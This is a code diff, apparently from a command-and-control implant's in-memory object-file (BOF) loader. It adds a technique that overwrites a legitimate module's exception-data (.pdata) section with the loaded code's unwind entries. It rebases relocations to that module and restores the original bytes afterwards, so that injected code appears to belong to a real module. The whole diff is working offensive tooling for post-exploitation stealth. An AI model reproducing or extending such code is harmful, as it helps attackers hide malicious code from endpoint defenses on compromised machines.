@@ -259,6 +259,19 @@ void CleanupSections(PCHAR* mapSections, int maxSections, LPVOID mapFunctions)
     }
 
     if (stomped) {
+        if (g_BofStomp.pdataStomped &&
+            g_BofStomp.savedPdata &&
+            g_BofStomp.pdataBase &&
+            g_BofStomp.pdataSize) {
+            DWORD pdProt = 0;
+            if (ApiWin->VirtualProtect(g_BofStomp.pdataBase, g_BofStomp.pdataSize, PAGE_READWRITE, &pdProt)) {
+                memcpy(g_BofStomp.pdataBase, g_BofStomp.savedPdata, g_BofStomp.pdataSize);
+                DWORD pdTmp = 0;
+                ApiWin->VirtualProtect(g_BofStomp.pdataBase, g_BofStomp.pdataSize, pdProt, &pdTmp);
+            }
+            g_BofStomp.pdataStomped = FALSE;
+        }
+
         DWORD oldProt = 0;
         ApiWin->VirtualProtect(g_BofStomp.cursorBase, g_BofStomp.cursorSize, PAGE_EXECUTE_READWRITE, &oldProt);
 
@@ -401,6 +414,7 @@ void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYM
     BOF_RUNTIME_FUNCTION* rfEntries       = NULL;
     DWORD                 rfEntriesSize   = 0;
     int                   registeredCount = 0;
+    BOOL                  wroteInPlace    = FALSE;
 #endif
     BOOL                  entryFound      = FALSE;
 
@@ -420,6 +434,14 @@ void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYM
 
         memcpy(bofPdata, (unsigned char*)pHeader + s->PointerToRawData, bofPdataSize);
 
+        BOOL      stompInPlace = (g_BofStomp.initialised &&
+                                  g_BofStomp.inUse &&
+                                  g_BofStomp.pdataBase &&
+                                  g_BofStomp.moduleBase &&
+                                  numEntries <= (int)g_BofStomp.pdataCapacity);
+        ULONG_PTR rvaBase      = stompInPlace ? (ULONG_PTR)g_BofStomp.moduleBase
+                                              : (ULONG_PTR)mapSections[0];
+
         COF_RELOCATION* relocs = (COF_RELOCATION*)((unsigned char*)pHeader + s->PointerToRelocations);
         for (int ri = 0; ri < s->NumberOfRelocations; ri++) {
             COF_RELOCATION* r   = &relocs[ri];
@@ -431,15 +453,56 @@ void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYM
             char* targetBase = mapSections[sym.SectionNumber - 1];
             if (!targetBase) continue;
 
-            DWORD* field  = (DWORD*)((unsigned char*)bofPdata + r->VirtualAddress);
-            DWORD  addend = *field;
-            *field = (DWORD)((ULONG_PTR)targetBase - (ULONG_PTR)mapSections[0] + (DWORD)sym.Value + addend);
+            DWORD*    field    = (DWORD*)((unsigned char*)bofPdata + r->VirtualAddress);
+            DWORD     addend   = *field;
+            ULONG_PTR absolute = (ULONG_PTR)targetBase + (DWORD)sym.Value + addend;
+
+            if (absolute < rvaBase || (absolute - rvaBase) > 0xFFFFFFFFULL) {
+                if (stompInPlace) {
+                    stompInPlace = FALSE;
+                    rvaBase      = (ULONG_PTR)mapSections[0];
+                    memcpy(bofPdata, (unsigned char*)pHeader + s->PointerToRawData, bofPdataSize);
+                    ri = -1;
+                    continue;
+                }
+            }
+            *field = (DWORD)(absolute - rvaBase);
         }
 
-        rfEntries     = bofPdata;
-        rfEntriesSize = bofPdataSize;
-        bofPdata      = NULL;
-        {
+        if (stompInPlace) {
+            for (int a = 1; a < numEntries; a++) {
+                BOF_RUNTIME_FUNCTION key = bofPdata[a];
+                int b = a - 1;
+                while (b >= 0 && bofPdata[b].BeginAddress > key.BeginAddress) {
+                    bofPdata[b + 1] = bofPdata[b];
+                    b--;
+                }
+                bofPdata[b + 1] = key;
+            }
+
+            DWORD oldProt = 0;
+            if (ApiWin->VirtualProtect(g_BofStomp.pdataBase, g_BofStomp.pdataSize, PAGE_READWRITE, &oldProt)) {
+                BOF_RUNTIME_FUNCTION* dst = (BOF_RUNTIME_FUNCTION*)g_BofStomp.pdataBase;
+                memcpy(dst, bofPdata, (DWORD)numEntries * sizeof(BOF_RUNTIME_FUNCTION));
+
+                for (DWORD k = (DWORD)numEntries; k < g_BofStomp.pdataCapacity; k++) {
+                    dst[k].BeginAddress = 0xFFFFFFFF;
+                    dst[k].EndAddress   = 0xFFFFFFFF;
+                    dst[k].UnwindData   = 0;
+                }
+
+                DWORD tmp = 0;
+                ApiWin->VirtualProtect(g_BofStomp.pdataBase, g_BofStomp.pdataSize, oldProt, &tmp);
+                g_BofStomp.pdataStomped = TRUE;
+                wroteInPlace = TRUE;
+            }
+
+            MemFreeLocal((LPVOID*)&bofPdata, bofPdataSize);
+            bofPdata = NULL;
+        } else {
+            rfEntries     = bofPdata;
+            rfEntriesSize = bofPdataSize;
+            bofPdata      = NULL;
             BOOL ok = (BOOL)(ULONG_PTR)ApiNt->RtlAddFunctionTable(
                 (void*)rfEntries, numEntries, (DWORD64)mapSections[0]
             );
@@ -450,6 +513,7 @@ void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYM
             MemFreeLocal((LPVOID*)&bofPdata, bofPdataSize);
         break;
     }
+
 #endif
 
     for (int i = 0; i < pHeader->NumberOfSymbols; i++) {
@@ -469,6 +533,20 @@ void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYM
             for (int j = 0; j < registeredCount; j++)
                 ApiNt->RtlDeleteFunctionTable((void*)&rfEntries[j]);
         }
+    }
+
+    if (wroteInPlace &&
+        g_BofStomp.pdataStomped &&
+        g_BofStomp.savedPdata &&
+        g_BofStomp.pdataBase &&
+        g_BofStomp.pdataSize) {
+        DWORD oldProt = 0;
+        if (ApiWin->VirtualProtect(g_BofStomp.pdataBase, g_BofStomp.pdataSize, PAGE_READWRITE, &oldProt)) {
+            memcpy(g_BofStomp.pdataBase, g_BofStomp.savedPdata, g_BofStomp.pdataSize);
+            DWORD tmp = 0;
+            ApiWin->VirtualProtect(g_BofStomp.pdataBase, g_BofStomp.pdataSize, oldProt, &tmp);
+        }
+        g_BofStomp.pdataStomped = FALSE;
     }
 #endif
 
